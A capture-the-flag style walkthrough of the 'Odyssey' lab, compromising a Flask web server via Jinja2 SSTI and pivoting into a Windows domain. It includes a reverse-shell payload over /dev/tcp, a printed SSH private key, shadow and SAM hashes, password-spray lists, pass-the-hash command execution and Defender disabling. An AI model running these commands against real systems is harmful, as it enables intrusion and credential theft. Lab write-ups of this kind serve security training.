# Odyssey
![[writeups/hacksmarter/odyssey (hard)/screenshots/logo.png]]
## Objective / Scope

You are a member of the **Hack Smarter Red Team** and have been assigned to perform a black-box penetration test against a client's critical infrastructure. There are three machines in scope: one Linux web server and two Windows enterprise hosts.

The client’s environment is currently in a degraded state due to ongoing migration efforts; the **Domain Controllers are experiencing synchronization failures**. Consequently, standard automated LDAP enumeration tools (such as BloodHound) are expected to fail or return unreliable data. The client wants to assess if an attacker can thrive in this "broken" environment where standard administrative tools are malfunctioning.

### Note From The Author
Odyssey was built off a recent engagement that I had where the DC's were not syncing correctly. This caused a lot of problems during the engagement. We also had to go through a proxy, which made tools like LDAP very hard to use. Your normal tools may fail... can you think outside the box?

## Enumeration
Firstly, with the hosts provided, the attacker will create hosts.txt and populate it.
```bash
➜ cat hosts.txt 
10.1.88.121
10.1.225.54
10.1.122.120
```

Next, the attacker will scan the hosts.
```bash
➜ nmap -sV -T4 -p- -iL hosts.txt > scans.tcp

👤 rosskeddy 🏠 /work took 16m59s 
➜ cat scans.tcp 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-02 14:05 -0500
Nmap scan report for DC-01 (10.1.88.121)
Host is up (0.027s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-01-02 19:21:21Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: hsm.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hsm.local, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

<SNIP>

Nmap scan report for WKST-01 (10.1.225.54)
Host is up (0.028s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC

<SNIP>

Nmap scan report for Web-01 (10.1.122.120)
Host is up (0.028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.3)

<SNIP>
```

The domain has been identified as `hsm.local`. The attacker will check for anonymous authentication.
```bash
➜ netexec smb hsm.local -u '' -p ''         
SMB         10.1.88.121     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:hsm.local) (signing:True) (SMBv1:False) 
SMB         10.1.88.121     445    DC01             [+] hsm.local\:
```

## Web-01
Browsing to `http://web-01:5000` reveals the "Odyssey Portal".

![Odyssey Portal](web01portal.png)

The template rendering feature appears vulnerable to attack after a simple XSS query is tested.

![XSS Testing](xss.png)

Checking for SSTI with a polyglot `${{<%[%'"}}%\.` reveals the following error chain. Of key value is the fact that the server is utilizing [jinja2](https://github.com/pallets/jinja). This makes privilege escalation with SSTI more likely.

![](./screenshots/ssti.png)

Now the attacker will try to derive useful information by exploiting the SSTI vulnerability. Eventually with enough time, the attacker was able to obtain RCE.
```python
{{''.__class__.__mro__[1].__subclasses__()[235].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
```

The SSTI above returned `uid=1001(ghill_sa) gid=1001(ghill_sa) groups=1001(ghill_sa)`.  
### Privilege Escalation
With SSTI working, the attacker will start a listener utilizing penelope.py.
```bash
➜ python3 penelope.py      
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.0.100.134 • 10.200.27.108
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

and then issue the following payload:
```python
{{''.__class__.__mro__[1].__subclasses__()[235].__init__.__globals__['__builtins__']['__import__']('os').popen('bash -c "bash -i >& /dev/tcp/10.200.27.108/4444 0>&1"').read()}}
```

This successfully triggers and returns a shell to the attacker.
```bash
➜ python3 penelope.py      
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.0.100.134 • 10.200.27.108
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from ip-10-1-122-120~10.1.122.120-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /opt/odyssey/venv/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/rosskeddy/.penelope/sessions/ip-10-1-122-120~10.1.122.120-Linux-x86_64/2026_01_02-15_27_51-079.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
ghill_sa@ip-10-1-122-120:~$ id
uid=1001(ghill_sa) gid=1001(ghill_sa) groups=1001(ghill_sa)
ghill_sa@ip-10-1-122-120:~$ 
```

With this user obtained, the attacker will create `users.txt` to target the Active Directory domain later.
```
ghill_sa
ghill
```
### Credentialed Enumeration
Checking the history reveals some keypair usage, the attacker will download the user's private key for persistence using penelope's built in download function.
```bash
ghill_sa@ip-10-1-122-120:~$ history
    1  cd /home/ghill_sa/.ssh/
    2  ls -la
    3  cat authorized_keys 
    4  ls -la
    5  cat authorized_keys 
    6  ls -la
    7  rm -rf id_ed25519.pub id_ed25519.pub.1 
    8  ls -la
    9  cd .ssh/
   10  ls -la
   11  cat known_hosts
   12  cat id_ed25519
   13  ifcon
   14  ip a
<SNIP>
ghill_sa@ip-10-1-122-120:~$ cat .ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDlR4d4ZqMDWl1/LeHNaNLC33iRLx1Ne43qxPT5mp/LrAAAAKD5KGBm+Shg
ZgAAAAtzc2gtZWQyNTUxOQAAACDlR4d4ZqMDWl1/LeHNaNLC33iRLx1Ne43qxPT5mp/LrA
AAAEAE/VeMQoNlS7zVBMghLqtkVtg/UFp5sdO4dJ6/vK+KlOVHh3hmowNaXX8t4c1o0sLf
eJEvHU17jerE9Pman8usAAAAF2doaWxsX3NhQGlwLTEwLTEtNDItMjE5AQIDBAUG
-----END OPENSSH PRIVATE KEY-----
```

Reading the app's source code reveals some honeypot/rabbit holes to lure and delay attackers. This is noted in case of issues later where defenders may be utilizing similar tactics.
```bash
ghill_sa@ip-10-1-122-120:/opt/odyssey$ cat app.py 
from flask import Flask, request, render_template_string, redirect, url_for

app = Flask(__name__)
# Fake login page with "SQL-like" error messages
@app.route("/login", methods=["GET", "POST"])

def login():
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        # Always fail, but make it look like SQL injection is possible
        if username == "admin" and password == "admin":
            return redirect(url_for("index"))
        else:
            return f"""
            <!DOCTYPE html>
            <html>
            <head><title>Odyssey Portal - Login</title></head>
            <body>
                <div style="margin:100px auto; width:300px; font-family:Arial;">
                    <h2>Login Failed</h2>
                    <p>Invalid credentials. SQL query error near: <code>'{username}'</code></p>
                    <a href="/login">Try Again</a>
```

After significant trial and error with process manipulation and attempting to manipulate the flask application. The attacker went back to the basics of what the breadcrumbs led to and discovered that the keypair worked for the root user.
```bash
✘ ssh root@web-01 -i ./id_ed25519
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.14.0-1016-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Jan  2 20:54:06 UTC 2026

  System load:  0.07              Temperature:           -273.1 C
  Usage of /:   45.1% of 6.71GB   Processes:             123
  Memory usage: 28%               Users logged in:       0
  Swap usage:   0%                IPv4 address for ens5: 10.1.122.120

  => There are 3 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Nov 19 11:16:38 2025 from 10.0.0.247
root@ip-10-1-122-120:~# 
```

### Credentialed Enumeration
With the system fully compromised, the attacker noticed significant data in the `.bash_history`. Something of interest was the following 
```bash
nano update.conf
cat /etc/crontab 
crontab 
crontab -e
cat update.conf | grep -ia ghill_sa -B 5 -A 5
```

and checking `crontab -e` revealed the following share:
`0 5 * * 4 cat /etc/update.conf >> \\dc01.hsm.local\share

In that file there are also credentials that the attacker can likely use to pivot into the active directory:
```zsh
[auth]
username=ghill_sa
password=P@ssw0rd!
```

Since the attacker is root, the `/etc/shadow` hashes are taken offline for attempted cracking and spraying against the active directory environment.
```zsh
➜ cat shadow.hashes 
root:$6$Zr5DnQ61/ut9zkn9$frvbMJHQy2sV9i4sbjEHrHFn7M5QP9H8Ud.gVZN1cPzge75HtskzOdbymTJMLSZgLEPbTSeshCX46.5MvxLLB0:20410:0:99999:7:::
ghill_sa:$6$Zr5DnQ61/ut9zkn9$frvbMJHQy2sV9i4sbjEHrHFn7M5QP9H8Ud.gVZN1cPzge75HtskzOdbymTJMLSZgLEPbTSeshCX46.5MvxLLB0:20409:0:99999:7:::
```
## WKST-01
%% While the above crontab was connecting to the DC, the credentials were not valid as a local or active directory user. %%

With the above credentials from crontab obtained, the attacker finds a foothold on the WKST-01 machine as a local user. 
```zsh
➜ netexec smb WKST-01 -u 'ghill_sa' -p 'P@ssw0rd!' --local-auth
SMB         10.1.225.54     445    EC2AMAZ-NS87CNK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-NS87CNK) (domain:EC2AMAZ-NS87CNK) (signing:False) (SMBv1:False) 
SMB         10.1.225.54     445    EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\ghill_sa:P@ssw0rd!
```

Somehow through further enumeration the attacker realized the `ghill_sa` account had access to privileged local shares, and therefor is likely to have administrator rights that the above NetExec did not identify.
```zsh
➜ netexec smb WKST-01 -u 'ghill_sa' -p 'P@ssw0rd!' --local-auth --shares
SMB         10.1.225.54     445    EC2AMAZ-NS87CNK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-NS87CNK) (domain:EC2AMAZ-NS87CNK) (signing:False) (SMBv1:False) 
SMB         10.1.225.54     445    EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\ghill_sa:P@ssw0rd! 
SMB         10.1.225.54     445    EC2AMAZ-NS87CNK  [*] Enumerated shares
SMB         10.1.225.54     445    EC2AMAZ-NS87CNK  Share           Permissions     Remark
SMB         10.1.225.54     445    EC2AMAZ-NS87CNK  -----           -----------     ------
SMB         10.1.225.54     445    EC2AMAZ-NS87CNK  ADMIN$          READ            Remote Admin
SMB         10.1.225.54     445    EC2AMAZ-NS87CNK  C$              READ,WRITE      Default share
SMB         10.1.225.54     445    EC2AMAZ-NS87CNK  IPC$            READ            Remote IPC
SMB         10.1.225.54     445    EC2AMAZ-NS87CNK  Share           READ,WRITE     
```

With access to those shares, the attacker will try another authentication method. RDP was successful in identifying that the `ghill_sa` user was an administrator.
```zsh
✘ netexec rdp WKST-01 -u 'ghill_sa' -p 'P@ssw0rd!' --local-auth       
RDP         10.1.225.54     3389   EC2AMAZ-NS87CNK  [*] Windows 10 or Windows Server 2016 Build 26100 (name:EC2AMAZ-NS87CNK) (domain:EC2AMAZ-NS87CNK) (nla:True)
RDP         10.1.225.54     3389   EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\ghill_sa:P@ssw0rd! (Pwn3d!)
```

With this level of access, the attacker would normally begin dumping credentials remotely however the attempts to do so yielded no results. It's possible AV/EDR is intercepting the requests to pull the files or similarly, since it's a Windows 11 box, the attacker is bumping into something like Credential Guard. Therefor, the attacker will manually RDP to the machine and begin attacking
```zsh
xfreerdp3 /v:10.1.225.54 /d:'WKST-01.HSM.LOCAL' /u:'ghill_sa' /p:'P@ssw0rd!' /cert:ignore /drive:share,/home/rosskeddy/work
```

![RDP Session on WKST-01](./screenshots/rdponwkst.png)


```cmd
C:\Windows\System32>whoami /all

USER INFORMATION
----------------

User Name                SID
======================== ============================================
ec2amaz-ns87cnk\ghill_sa S-1-5-21-369178893-2126662886-588481051-1000


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users         Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE             Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

ERROR: Unable to get user claims information.
```

The attacker will also enumerate users and descriptions, `bbarkinson` appears to be a user of interest.

![Workstation LUSRMGR User Enumeration](./screenshots/wkstusers.png)

```cmd
C:\Windows\System32>net users

User accounts for \\EC2AMAZ-NS87CNK

-------------------------------------------------------------------------------
Administrator            audit_user               bbarkinson
db_readonly              DefaultAccount           devops_user
eng_user                 facilities_user          fin_user1
ghill_sa                 Guest                    hr_admin
intranet_admin           inv_user                 legal_user
mktg_user                ops_mgr                  payroll_clerk
procure_user             proj_mgr                 research_user
sales_rep                support_staff            training_user
vpn_user                 WDAGUtilityAccount
The command completed successfully.

C:\Windows\System32>net user bbarkinson
User name                    bbarkinson
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/18/2025 8:27:28 PM
Password expires             Never
Password changeable          11/19/2025 8:27:28 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.
```

### Privilege Escalation

With access to `C:\Share` which is a goldmine of department documentation, the current user also has **SeBackupPrivilege**. Utilizing this privilege, the attacker will issue the following into that share and copy the entire share offline.
```cmd
C:\>cd C:\Share

C:\Share>reg save hklm\sam .\sam
The operation completed successfully.

C:\Share>reg save hklm\system .\system
The operation completed successfully.
```

![Downloading the Contents of C:\Share to the Attacker Machine](./screenshots/wkstdownloads.png)

Several credentials were obtained via secretsdump and via manual file browsing.

```bash
➜ secretsdump.py -sam sam -system system LOCAL     
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x7c7cfe4ff1d4639aaa93ddd2be306cc0
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d5cad8a9782b2879bf316f56936f1e36:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7490f2a63d713a813eda5bf8fd1a8227:::
ghill_sa:1000:aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b:::
fin_user1:1001:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
hr_admin:1002:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
proj_mgr:1003:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
db_readonly:1004:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
audit_user:1005:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
payroll_clerk:1006:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
vpn_user:1007:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
intranet_admin:1008:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
inv_user:1009:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
training_user:1010:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
devops_user:1011:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
support_staff:1012:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
mktg_user:1013:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
sales_rep:1014:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
legal_user:1015:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
ops_mgr:1016:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
eng_user:1017:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
procure_user:1018:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
facilities_user:1019:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
research_user:1020:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
bbarkinson:1021:aad3b435b51404eeaad3b435b51404ee:53c3709ae3d9f4428a230db81361ffbc:::
[*] Cleaning up...
```

Taking all the above documentation and information the attacker will create three lists.

`users.txt`
```
ghill_sa
ghill
fin_user1
hr_admin
intranet_admin
payroll_clerk
ops_mgr
procure_usr
proj_mgr
research_user
sales_rep
support_staff
training_user
db_readonly
audit_user
vpn_user
inv_user
devops_user
mktg_user
legal_user
eng_user
facilities_user
bbarkinson
Administrator
```

`passwords.txt`
```
P@ssw0rd!
Spring2025!
Welcome123!
Intra#Access
Pay
OpsSecure2025
BuyStuff2025
Delta@789
LabWork2025
SellMore2025
HelpDesk#2025
Learn!2025
Building2025
ReadOnly#456
Pipeline@2025
SecureAudit2025
CAD@2025
StockCheck2025
CaseFile2025
Campaign2025
NetWork@2025
```

`hashes.txt`
```
d5cad8a9782b2879bf316f56936f1e36
31d6cfe0d16ae931b73c59d7e0c089c0
31d6cfe0d16ae931b73c59d7e0c089c0
7490f2a63d713a813eda5bf8fd1a8227
217e50203a5aba59cefa863c724bf61b
5d9dc889caa181140f5ec16016ab3754
5d9dc889caa181140f5ec16016ab3754
5d9dc889caa181140f5ec16016ab3754
5d9dc889caa181140f5ec16016ab3754
5d9dc889caa181140f5ec16016ab3754
5d9dc889caa181140f5ec16016ab3754
5d9dc889caa181140f5ec16016ab3754
5d9dc889caa181140f5ec16016ab3754
5d9dc889caa181140f5ec16016ab3754
5d9dc889caa181140f5ec16016ab3754
5d9dc889caa181140f5ec16016ab3754
5d9dc889caa181140f5ec16016ab3754
5d9dc889caa181140f5ec16016ab3754
5d9dc889caa181140f5ec16016ab3754
5d9dc889caa181140f5ec16016ab3754
5d9dc889caa181140f5ec16016ab3754
5d9dc889caa181140f5ec16016ab3754
5d9dc889caa181140f5ec16016ab3754
5d9dc889caa181140f5ec16016ab3754
5d9dc889caa181140f5ec16016ab3754
53c3709ae3d9f4428a230db81361ffbc
```

Utilizing the above lists the attacker will spray the passwords/hashes against the Administrator. This yielded no results but `bbarkinson` was a valid active directory credential.
```zsh
➜ netexec ldap DC01 -u 'bbarkinson' -H 53c3709ae3d9f4428a230db81361ffbc
LDAP        10.1.88.121     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:hsm.local)
LDAP        10.1.88.121     389    DC01             [+] hsm.local\bbarkinson:53c3709ae3d9f4428a230db81361ffbc
```

The attacker still needed to retrieve the WKST-01 flag. Since the hashes were not crackable and a number of connection methods were being blocks. The attacker therefor utilized NetExec to change the Administrator password and connect via RDP to retrieve the flag.
```zsh
✘ nxc smb WKST-01 -u 'Administrator' -H 'd5cad8a9782b2879bf316f56936f1e36' --local-auth -x 'net user Administrator Password123!'
SMB         10.1.225.54     445    EC2AMAZ-NS87CNK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-NS87CNK) (domain:EC2AMAZ-NS87CNK) (signing:False) (SMBv1:False) 
SMB         10.1.225.54     445    EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\Administrator:d5cad8a9782b2879bf316f56936f1e36 (Pwn3d!)
SMB         10.1.225.54     445    EC2AMAZ-NS87CNK  [+] Executed command via wmiexec
SMB         10.1.225.54     445    EC2AMAZ-NS87CNK  The command completed successfully.
```

![WKST-01 Administrator Flag](./screenshots/wkstadminflag.png)

Due to the connection struggles, the attacker attempted to use SharpHound. Utilizing the same methods above with mounting the drive and using RDP, the attacker will upload SharpHound.exe.

Firstly let's tell Defender to go away:
![Disabling Defender](./screenshots/goaway.png)

SharpHound collection failed:
```cmd
C:\Users\Administrator\Desktop>SharpHound.exe -c All
2026-01-03T15:39:49.5242090+00:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2026-01-03T15:39:50.0581748+00:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-01-03T15:39:50.1368795+00:00|INFORMATION|Initializing SharpHound at 3:39 PM on 1/3/2026
2026-01-03T15:39:50.5654094+00:00|CRITICAL|unable to get current domain
```
*it's always DNS*. Tyler was nice enough to provide some possible clues on his recent engagement. Therefor the attacker will change some settings on the devices. By changing the DNS server it allowed connections to the DC.

![WKST-01 IP Settings](./screenshots/ipsettings.png)

```cmd
-- BEFORE --
C:\Users\Administrator\Desktop>ping hsm.local
Ping request could not find host hsm.local. Please check the name and try again.

-- AFTER --
C:\Users\Administrator\Desktop>ping hsm.local

Pinging hsm.local [10.1.88.121] with 32 bytes of data:
Reply from 10.1.88.121: bytes=32 time<1ms TTL=128
Reply from 10.1.88.121: bytes=32 time<1ms TTL=128

Ping statistics for 10.1.88.121:
    Packets: Sent = 2, Received = 2, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
Control-C
^C
C:\Users\Administrator\Desktop>
```

However, SharpHound was still failing with an LDAP error.
`ERROR|Unable to connect to LDAP: All attempted connections failed`

Performing further enumeration reveals the MAQ is default. The attacker will abuse this to try and leverage it for further attack paths.
```zsh
➜ netexec ldap DC01 -u 'bbarkinson' -H 53c3709ae3d9f4428a230db81361ffbc -M maq
LDAP        10.1.88.121     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:hsm.local)
LDAP        10.1.88.121     389    DC01             [+] hsm.local\bbarkinson:53c3709ae3d9f4428a230db81361ffbc 
MAQ         10.1.88.121     389    DC01             [*] Getting the MachineAccountQuota
MAQ         10.1.88.121     389    DC01             MachineAccountQuota: 10
```

Utilizing bloodyAD the attacker can simply create a machine `IMCOMINGFORYOU` and confirm it's creation with NetExec.
```zsh
➜ bloodyAD --host dc01.hsm.local -d hsm.local -u 'bbarkinson' -p :53c3709ae3d9f4428a230db81361ffbc --host 10.1.88.121 add computer IMCOMINGFORYOU 'Password123!'
[+] IMCOMINGFORYOU$ created

➜ netexec ldap DC01 -u 'IMCOMINGFORYOU$' -p 'Password123!'                    
LDAP        10.1.88.121     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:hsm.local)
LDAP        10.1.88.121     389    DC01             [+] hsm.local\IMCOMINGFORYOU$:Password123!
```

Note: Do not use quotes to wrap objects in cmd...
```cmd
C:\Users\Administrator\Desktop>SharpHound.exe -c All -d hsm.local --domaincontroller dc01.hsm.local --ldapusername IMCOMINGFORYOU$ --ldappassword Password123! --zipfilename hsm.local
2026-01-03T16:09:34.2400052+00:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2026-01-03T16:09:34.4350232+00:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-01-03T16:09:34.4804773+00:00|INFORMATION|Initializing SharpHound at 4:09 PM on 1/3/2026
2026-01-03T16:09:35.9762903+00:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-01-03T16:09:36.2450629+00:00|INFORMATION|Beginning LDAP search for hsm.local
2026-01-03T16:09:36.3623135+00:00|INFORMATION|Beginning LDAP search for hsm.local Configuration NC
2026-01-03T16:09:36.4028157+00:00|INFORMATION|Producer has finished, closing LDAP channel
2026-01-03T16:09:36.4085984+00:00|INFORMATION|LDAP channel closed, waiting for consumers
2026-01-03T16:09:36.5070793+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for HSM.LOCAL
2026-01-03T16:09:36.5085819+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for HSM.LOCAL
2026-01-03T16:09:37.3042136+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for HSM.LOCAL
2026-01-03T16:09:38.0008766+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for HSM.LOCAL
2026-01-03T16:09:38.0049038+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for HSM.LOCAL
2026-01-03T16:09:39.8690728+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for HSM.LOCAL
2026-01-03T16:09:40.5664509+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for HSM.LOCAL
2026-01-03T16:09:45.7616688+00:00|ERROR|Unhandled LDAP InvalidCred error code during LDAP test: SharpHoundCommonLib.Ntlm.LdapNativeException: SASL bind failed. LDAP error code: 49. Server error: 8009030C: LdapErr: DSID-0C0906C3, comment: AcceptSecurityContext error, data 52e, v65f4
   at SharpHoundCommonLib.Ntlm.LdapConnection.SaslBind(String distinguishedName, String mechanism, Byte[] credential)
   at System.Threading.Tasks.Task`1.InnerInvoke()
   at System.Threading.Tasks.Task.Execute()
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
   at SharpHoundCommonLib.Ntlm.LdapTransport.<AuthenticateAsync>d__12.MoveNext()
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
   at SharpHoundCommonLib.Ntlm.NtlmAuthenticationHandler.<PerformNtlmAuthenticationAsync>d__7.MoveNext()
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
   at SharpHoundCommonLib.Processors.DCLdapProcessor.<Authenticate>d__18.MoveNext(), Server error: 8009030C: LdapErr: DSID-0C0906C3, comment: AcceptSecurityContext error, data 52e, v65f4
2026-01-03T16:09:45.7881714+00:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2026-01-03T16:09:46.4727081+00:00|INFORMATION|Output channel closed, waiting for output task to complete
2026-01-03T16:09:46.6528036+00:00|INFORMATION|Status: 311 objects finished (+311 31.1)/s -- Using 42 MB RAM
2026-01-03T16:09:46.6528036+00:00|INFORMATION|Enumeration finished in 00:00:10.4235990
2026-01-03T16:09:46.7726039+00:00|INFORMATION|Saving cache with stats: 13 ID to type mappings.
 0 name to SID mappings.
 1 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2026-01-03T16:09:46.8196855+00:00|INFORMATION|SharpHound Enumeration Completed at 4:09 PM on 1/3/2026! Happy Graphing!
```

